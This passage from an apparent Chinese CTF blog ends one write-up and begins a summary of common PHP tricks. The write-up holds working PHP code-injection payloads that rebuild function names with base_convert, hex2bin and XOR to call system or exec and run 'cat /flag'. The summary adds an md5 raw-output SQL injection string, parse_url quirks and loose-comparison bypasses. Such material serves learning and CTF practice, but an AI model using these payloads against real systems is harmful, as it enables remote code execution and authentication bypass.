<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>) =&gt; <span class="string">&quot;hex2bin&quot;</span></span><br><span class="line">dechex(<span class="number">1598506324</span>) =&gt; <span class="string">&quot;5f474554&quot;</span></span><br><span class="line"><span class="meta"><span class="meta-keyword">$pi</span>=hex2bin(&quot;5f474554&quot;) =&gt; $pi=&quot;_GET&quot;   //hex2bin将一串16进制数转换为二进制字符串</span></span><br><span class="line">(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;) =&gt; (<span class="symbol">$</span>_GET)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span>_GET)&#123;<span class="built_in">abs</span>&#125;) <span class="comment">//&#123;&#125;可以代替[]</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>方法二：拼凑出getallheaders利用HeaderRCE</strong></p>
<blockquote>
<p>getallheaders — 获取全部 HTTP 请求头信息</p>
</blockquote>
<p><img src="https://raw.githubusercontent.com/npfs06/Images/main/img/buu56-2.jpg"></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert,<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)(<span class="symbol">$</span><span class="built_in">pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>)()&#123;<span class="number">1</span>&#125;)</span><br><span class="line"></span><br><span class="line">然后抓包在请求头中添加 <span class="number">1</span>：cat /flag</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分析</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">(<span class="number">696468</span>,<span class="number">10</span>,<span class="number">36</span>)</span></span> =&gt; <span class="string">&quot;exec&quot;</span></span><br><span class="line"><span class="variable">$pi</span>(<span class="number">8768397090111664438</span>,<span class="number">10</span>,<span class="number">30</span>) =&gt; <span class="string">&quot;getallheaders&quot;</span></span><br><span class="line"><span class="function"><span class="title">exec</span><span class="params">(getallheaders()</span></span>&#123;<span class="number">1</span>&#125;)</span><br><span class="line"><span class="comment">//操作xx和yy，中间用逗号隔开，echo都能输出</span></span><br><span class="line">echo xx,yy</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><strong>方法三：异或</strong></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$payload</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>,  <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span> , <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$k</span>=<span class="number">1</span>;<span class="variable">$k</span>&lt;=sizeof(<span class="variable">$payload</span>);<span class="variable">$k</span>++)&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>;<span class="variable">$i</span> &lt; <span class="number">9</span>; <span class="variable">$i</span>++)&#123;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$j</span> = <span class="number">0</span>;<span class="variable">$j</span> &lt;=<span class="number">9</span>;<span class="variable">$j</span>++)&#123;</span><br><span class="line">            <span class="variable">$exp</span> = <span class="variable">$payload</span>[<span class="variable">$k</span>] ^ <span class="variable">$i</span>.<span class="variable">$j</span>;</span><br><span class="line">            <span class="keyword">echo</span>(<span class="variable">$payload</span>[<span class="variable">$k</span>].<span class="string">&quot;^<span class="subst">$i</span><span class="subst">$j</span>&quot;</span>.<span class="string">&quot;==&gt;<span class="subst">$exp</span>&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;       &quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>在运行结果中找到_GET即可，构造payload</p>
<blockquote>
<p>is_nan^64==&gt;_G</p>
<p>tan^15==&gt;ET</p>
</blockquote>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/?c=<span class="variable">$pi</span>=(is_nan^(<span class="number">6</span>).(<span class="number">4</span>)).(tan^(<span class="number">1</span>).(<span class="number">5</span>));<span class="variable">$pi</span>=<span class="variable">$$pi</span>;<span class="variable">$pi</span>&#123;<span class="number">0</span>&#125;(<span class="variable">$pi</span>&#123;<span class="number">1</span>&#125;)&amp;<span class="number">0</span>=system&amp;<span class="number">1</span>=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>web入门</category>
      </categories>
  </entry>
  <entry>
    <title>ctf中php常见知识点总结</title>
    <url>/2020/07/20/ctf%E4%B8%ADphp%E5%B8%B8%E8%A7%81%E7%9F%A5%E8%AF%86%E7%82%B9%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<p>ctf中php常见知识点总结<a id="more"></a></p>
<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><h2 id="系统变量（超全局变量）"><a href="#系统变量（超全局变量）" class="headerlink" title="系统变量（超全局变量）"></a>系统变量（超全局变量）</h2><p>在全部作用域中始终可用的内置变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$GLOBALS</span> <span class="comment">// 引用全局作用域中可用的全部变量</span></span><br><span class="line"><span class="variable">$_POST</span> <span class="comment">// 获取 post 数据，是一个字典</span></span><br><span class="line"><span class="variable">$_GET</span> <span class="comment">// 获取 get 数据，是一个字典</span></span><br><span class="line"><span class="variable">$_COOKIE</span> <span class="comment">// 获取 cookie</span></span><br><span class="line"><span class="variable">$_SESSION</span> <span class="comment">// 获取 session</span></span><br><span class="line"><span class="variable">$_FILES</span> <span class="comment">// 获取上传的文件</span></span><br><span class="line"><span class="variable">$_REQUEST</span> <span class="comment">// 获取 $_GET，$_POST，$_COOKIE 中的数据</span></span><br><span class="line"><span class="variable">$_ENV</span> <span class="comment">// 环境变量</span></span><br><span class="line"><span class="variable">$_SERVER</span> <span class="comment">// 服务器和执行环境信息</span></span><br></pre></td></tr></table></figure>
<h2 id="可变变量"><a href="#可变变量" class="headerlink" title="可变变量"></a>可变变量</h2><p>可变变量是 php 独有的特性，可变变量指的是变量名可变，将一个普通变量的值作为可变变量的变量名，而变量（即普通变量）指的是变量值可变。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span>=<span class="string">&quot;hello&quot;</span>;</span><br><span class="line"><span class="comment">// 定义可变变量时，可以加上大括号</span></span><br><span class="line">$&#123;<span class="variable">$a</span>&#125;=<span class="string">&quot;world&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $&#123;<span class="variable">$a</span>&#125;;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$$a</span>; <span class="comment">// 将普通变量的值 hello，作为可变变量的变量名，即 $a</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$hello</span>;</span><br></pre></td></tr></table></figure>
<h2 id="错误控制运算符"><a href="#错误控制运算符" class="headerlink" title="错误控制运算符"></a>错误控制运算符</h2><p>PHP 支持一个错误控制运算符：@。当将其放置在一个PHP 表达式之前，该表达式可能产生的任何错误信息都被忽略掉。</p>
<h2 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h2><p>定义数组的方法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="keyword">array</span>(</span><br><span class="line">    <span class="string">&quot;user&quot;</span> =&gt; <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;pass&quot;</span>=&gt;<span class="string">&quot;P@ssw0rd&quot;</span></span><br><span class="line">);</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line"><span class="variable">$a</span>[<span class="string">&#x27;pass&#x27;</span>] = <span class="string">&#x27;P@ssw0rd&#x27;</span>;</span><br></pre></td></tr></table></figure>
<h2 id="Quotation-Marks"><a href="#Quotation-Marks" class="headerlink" title="Quotation Marks"></a>Quotation Marks</h2><p>双引号解析变量，单引号不解析变量</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;str is <span class="subst">$str</span>&quot;</span>; <span class="comment">// 运行结果 : str is hello</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;str is $str&#x27;</span>; <span class="comment">// 运行结果 : str is $str</span></span><br></pre></td></tr></table></figure>
<h2 id="变量默认值"><a href="#变量默认值" class="headerlink" title="变量默认值"></a>变量默认值</h2><p>当定义一个变量，如果没有设置值，默认为0</p>
<h2 id="打印变量"><a href="#打印变量" class="headerlink" title="打印变量"></a>打印变量</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">print_r，显示关于一个变量的易于理解的信息。如果给出的是 <span class="keyword">string</span>、<span class="keyword">integer</span> 或 <span class="keyword">float</span>，将打印变量值本身。如果给出的是 <span class="keyword">array</span>，将会按照一定格式显示键和元素。<span class="keyword">object</span> 与数组类似。</span><br><span class="line">var_dump，返回变量的数据类型和值</span><br><span class="line"><span class="number">12</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;aaa&#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&#x27;123&#x27;</span>);</span><br><span class="line">print_r(<span class="string">&#x27;aaa&#x27;</span>);</span><br></pre></td></tr></table></figure>
<h2 id="文件操作相关"><a href="#文件操作相关" class="headerlink" title="文件操作相关"></a>文件操作相关</h2><p>列出目录</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">scandir(<span class="string">&#x27;/site&#x27;</span>)</span><br></pre></td></tr></table></figure>
<p>输出文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">show_source(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">highlight_file(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line">var_dump(file(<span class="string">&#x27;flag.php&#x27;</span>));</span><br><span class="line">print_r(file(<span class="string">&#x27;flag.php&#x27;</span>));</span><br></pre></td></tr></table></figure>
<p>读取文件内容</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">file_get_contents(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="comment">#也可以读取远程 URL 的文件</span></span><br><span class="line">file_get_contents(<span class="string">&#x27;http://xxx.xxx.com/index.html&#x27;</span>);</span><br><span class="line"><span class="comment">#输入不合法的url会显示Error: Invalid URL，如果对php的报错熟悉会知道这可能是由 file_get_contents 函数触发的报错</span></span><br></pre></td></tr></table></figure>
<h1 id="GET-和-POST"><a href="#GET-和-POST" class="headerlink" title="$_GET 和 $_POST"></a>$_GET 和 $_POST</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//www.example.com/web/false.php?name[]=a&amp;password[]=b</span></span><br></pre></td></tr></table></figure>
<p>如果 GET 参数中设置 name[]=a，那么 $_GET[‘name’] = [a]，php 会把 []=a 当成数组传入， $_GET 会自动对参数调用 urldecode。</p>
<p>$_POST 同样存在此漏洞，提交的表单数据，user[]=admin，$_POST[‘user’] 得到的是 [‘admin’] 是一个数组。</p>
<h1 id="内置函数的松散性"><a href="#内置函数的松散性" class="headerlink" title="内置函数的松散性"></a>内置函数的松散性</h1><h2 id="strcmp-和-strcasecmp"><a href="#strcmp-和-strcasecmp" class="headerlink" title="strcmp 和 strcasecmp"></a>strcmp 和 strcasecmp</h2><p>strcmp 和 strcasecmp（不区分大小写） 用于比较字符串，返回值如下：</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">如果 str1 小于 str2 返回 &lt; <span class="number">0</span>；</span><br><span class="line">如果 str1 大于 str2 返回 &gt; <span class="number">0</span>；</span><br><span class="line">如果两者相等，返回 <span class="number">0</span>。</span><br></pre></td></tr></table></figure>
<p>数组跟字符串比较会返回 0</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$array</span>=[<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"><span class="comment">//这里会输出 null，在某种意义上 null 也就是相当于 false，也就是判断为相等</span></span><br><span class="line">var_dump(strcmp(<span class="variable">$array</span>, <span class="string">&#x27;abc&#x27;</span>)); </span><br><span class="line">var_dump(strcasecmp(<span class="variable">$array</span>, <span class="string">&#x27;abc&#x27;</span>));</span><br></pre></td></tr></table></figure>
<h2 id="sha1-和-md5-函数"><a href="#sha1-和-md5-函数" class="headerlink" title="sha1 和 md5 函数"></a>sha1 和 md5 函数</h2><p>语法</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment"># raw为可选，规定十六进制或二进制输出格式</span></span><br><span class="line"><span class="comment"># TRUE - 原始 16 字节格式</span></span><br><span class="line"><span class="comment"># FALSE - 默认，32 字符十六进制数</span></span><br><span class="line">md5(<span class="keyword">string</span>, raw)</span><br></pre></td></tr></table></figure>
<p>md5 和 sha1 无法处理数组，但是 php 没有抛出异常，直接返回 fasle</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sha1([]) === <span class="literal">false</span></span><br><span class="line">md5([]) === <span class="literal">false</span></span><br></pre></td></tr></table></figure>
<p>md5 和 sha1 支持第二个参数，如果为 true，则会将 hash 后的 16 进制字符串以 16 进制转成字符串的形式返回，如果在 SQL 语句中这样写，会存在注入的问题。</p>
<p>提供一个字符串：ffifdyop，md5后，276f722736c95d99e921722cf9ed621c<br>再转成字符串： ‘or’6</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 可以实现绕过</span></span><br><span class="line"><span class="variable">$password</span> = <span class="string">&quot;ffifdyop&quot;</span>;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM admin WHERE pass = &#x27;&quot;</span>.md5(<span class="variable">$password</span>,<span class="literal">true</span>).<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">var_dump(<span class="variable">$sql</span>);</span><br></pre></td></tr></table></figure>
<h2 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url"></a>parse_url</h2><p>parse_url() 函数可以解析 URL，返回其组成部分，此函数并不意味着给定的 URL 是合法的，它只是将上方列表中的各部分分开。parse_url() 可接受不完整的 URL，并尽量将其解析正确。</p>
<p>\1. url解析错误</p>
<p>parse_url在url不能被解析的时候就会返回false。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">var_dump(parse_url(<span class="variable">$url</span>));</span><br></pre></td></tr></table></figure>
<p>当一个url没有协议的时候，但是给一个端口url的字符串的时候parse_url就会爆错。这个经测试在windows下应该是php版本全通杀的(5.2-7.0)，linux没测试过。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/pupiles.com:<span class="number">80</span></span><br></pre></td></tr></table></figure>
<p>只要端口后面跟字母还是会解析，比如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">/pupiles.com:<span class="number">80</span>a</span><br><span class="line"><span class="keyword">array</span> (size=<span class="number">1</span>)</span><br><span class="line">  <span class="string">&#x27;path&#x27;</span> =&gt; <span class="keyword">string</span> <span class="string">&#x27;/pupiles.com:80a&#x27;</span> (length=<span class="number">16</span>)</span><br></pre></td></tr></table></figure>
<p>\2. 端口解析错误</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">// php5.5以上这样的url用parse_url解析后预测的结果是</span></span><br><span class="line"><span class="comment">//pupiles.com/about:1234</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">array</span>(<span class="number">2</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>然而实际结果是</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123;</span><br><span class="line">  [<span class="string">&quot;host&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">11</span>) <span class="string">&quot;pupiles.com&quot;</span></span><br><span class="line">  [<span class="string">&quot;port&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">int</span>(<span class="number">1234</span>)</span><br><span class="line">  [<span class="string">&quot;path&quot;</span>]=&gt;</span><br><span class="line">  <span class="keyword">string</span>(<span class="number">9</span>) <span class="string">&quot;/about:1234&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>会默认解析出一个portkey</p>
<p>\3. 路径解析错误</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// single slash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;/upload?/home/binarycloud/&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = parse_url(<span class="variable">$uri</span>);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="comment">// doubleslash case</span></span><br><span class="line"><span class="variable">$uri</span> = <span class="string">&quot;//upload?/home/binarycloud/&quot;</span>;</span><br><span class="line"><span class="variable">$data</span> = parse_url(<span class="variable">$uri</span>);</span><br><span class="line">print_r(<span class="variable">$data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>输出结果</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [path] =&gt; /upload</span><br><span class="line">    [query] =&gt; /home/binarycloud/</span><br><span class="line">)</span><br><span class="line"><span class="keyword">Array</span></span><br><span class="line">(</span><br><span class="line">    [host] =&gt; upload?</span><br><span class="line">    [path] =&gt; /home/binarycloud/</span><br><span class="line">)</span><br></pre></td></tr></table></figure>
<p>\4. 端口溢出</p>
<p>在php5.3.13版本以下，当输入如下url</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//pupiles:78325</span></span><br></pre></td></tr></table></figure>
<p>按照正常来说应该会返回false，但是这里会返回</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">array</span>(<span class="number">3</span>) &#123; </span><br><span class="line">    [<span class="string">&quot;scheme&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">4</span>) <span class="string">&quot;http&quot;</span> </span><br><span class="line">    [<span class="string">&quot;host&quot;</span>]=&gt; <span class="keyword">string</span>(<span class="number">7</span>) <span class="string">&quot;pupiles&quot;</span> </span><br><span class="line">    [<span class="string">&quot;port&quot;</span>]=&gt; <span class="keyword">int</span>(<span class="number">12789</span>) </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h1 id="弱类型"><a href="#弱类型" class="headerlink" title="弱类型"></a>弱类型</h1><ul>
<li>当一个整形和一个其他类型行比较的时候，会先把其他类型 intval 再比较</li>
<li>bool类型的 true 跟任意字符串可以弱类型相等</li>
</ul>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span> == <span class="string">&#x27;1abc&#x27;</span> <span class="comment">// true</span></span><br><span class="line"><span class="literal">true</span> == <span class="string">&#x27;abcd&#x27;</span>  <span class="comment">// true </span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;42.0&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;000042.00&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;0x000000002A&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;10&quot;</span> == <span class="string">&quot;1e1&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;0000000004.2E+1&quot;</span> <span class="comment">// true</span></span><br><span class="line"><span class="string">&quot;42&quot;</span> == <span class="string">&quot;42.0e+000000&quot;</span> <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line">[<span class="literal">false</span>] == [<span class="number">0</span>] == [<span class="literal">NULL</span>] == [<span class="string">&#x27;&#x27;</span>]</span><br><span class="line"><span class="literal">NULL</span> == <span class="literal">false</span> == <span class="number">0</span></span><br><span class="line"><span class="number">1234567891011</span></span><br><span class="line"><span class="string">&#x27;0.999999999999999999999&#x27;</span> == <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0e1&#x27;</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0E1&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27; 01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27;01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;010e2&#x27;</span> == <span class="string">&#x27;01e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;10&#x27;</span> == <span class="string">&#x27;010&#x27;</span></span><br><span class="line"><span class="string">&#x27;10.0&#x27;</span> == <span class="string">&#x27;10&#x27;</span></span><br><span class="line"><span class="string">&#x27;10&#x27;</span> == <span class="string">&#x27;00000000010&#x27;</span></span><br><span class="line"><span class="string">&#x27;12345678&#x27;</span> == <span class="string">&#x27;00000000012345678&#x27;</span></span><br><span class="line"><span class="string">&#x27;0010e2&#x27;</span> == <span class="string">&#x27;1e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;123000&#x27;</span> == <span class="string">&#x27;123e3&#x27;</span></span><br><span class="line"><span class="string">&#x27;123000e2&#x27;</span> == <span class="string">&#x27;123e5&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in 5.2.1+</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.0 - 5.2.0</span></span><br><span class="line"><span class="string">&#x27;608E-4234&#x27;</span> == <span class="string">&#x27;272E-3063&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 5.6.x</span></span><br><span class="line"><span class="comment"># false in 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0x0&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABC&#x27;</span> == <span class="string">&#x27;0xabc&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27;0xabcDEF&#x27;</span></span><br><span class="line"><span class="string">&#x27;000000e1&#x27;</span> == <span class="string">&#x27;0x000000&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABFe1&#x27;</span> == <span class="string">&#x27;0xABFE1&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27;0Xe&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCDEF&#x27;</span> == <span class="string">&#x27;11259375&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xABCDEF123&#x27;</span> == <span class="string">&#x27;46118400291&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x1234AB&#x27;</span> == <span class="string">&#x27;1193131&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x1234Ab&#x27;</span> == <span class="string">&#x27;1193131&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 4.3.9, 5.2.1 - 5.6.x</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0xABCdef&#x27;</span> == <span class="string">&#x27; 0xabcDEF&#x27;</span></span><br><span class="line"><span class="string">&#x27;1e1&#x27;</span> == <span class="string">&#x27;0xa&#x27;</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27; 0Xe&#x27;</span></span><br><span class="line"><span class="string">&#x27;0x123&#x27;</span> == <span class="string">&#x27; 0x123&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.2.0</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2, 5.2.1 - 5.6.26, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0e0&#x27;</span> == <span class="string">&#x27;0x0a&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># true in PHP 4.3.0 - 4.3.9, 5.0.0 - 5.0.2</span></span><br><span class="line"><span class="comment"># false in PHP 4.3.10 - 4.4.9, 5.0.3 - 5.6.26, 7.0.0+</span></span><br><span class="line"><span class="string">&#x27;0xe&#x27;</span> == <span class="string">&#x27; 0Xe.&#x27;</span></span><br></pre></td></tr></table></figure>
<h2 id="intval"><a href="#intval" class="headerlink" title="intval"></a>intval</h2><p>intval() 在转换的时候，会从字符串的开始进行转换直到遇到一个非数字的字符。即使出现无法转换的字符串，intval() 不会报错而是返回 0。</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">var_dump(intval(<span class="string">&#x27;2&#x27;</span>)) <span class="comment">// 2</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;3abcd&#x27;</span>)) <span class="comment">// 3</span></span><br><span class="line">var_dump(intval(<span class="string">&#x27;abcd&#x27;</span>)) <span class="comment">// 0</span></span><br><span class="line"></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;0&#x27;</span>); <span class="comment">// true</span></span><br><span class="line">var_dump(<span class="number">0</span> == <span class="string">&#x27;abcdefg&#x27;</span>); <span class="comment">// true </span></span><br><span class="line">var_dump(<span class="number">0</span> === <span class="string">&#x27;abcdefg&#x27;</span>); <span class="comment">// false</span></span><br><span class="line">var_dump(<span class="number">1</span> == <span class="string">&#x27;1abcdef&#x27;</span>); <span class="comment">// true</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval(<span class="variable">$a</span>) &gt; <span class="number">1000</span>) &#123;</span><br><span class="line">    mysql_query(<span class="string">&quot;select * from news where id=&quot;</span>.<span class="variable">$a</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="trim"><a href="#trim" class="headerlink" title="trim"></a>trim</h2><p>trim 函数会过滤空格以及 \n\r\t\v\0，但不会过滤过滤\f</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="string">&quot;  \n\r\t\v\0abc  \f&quot;</span>;</span><br><span class="line">var_dump(trim(<span class="variable">$a</span>)); <span class="comment">// abc  \f</span></span><br></pre></td></tr></table></figure>
<p>利用 trim 及 is_numeric 等函数实现的绕过</p>
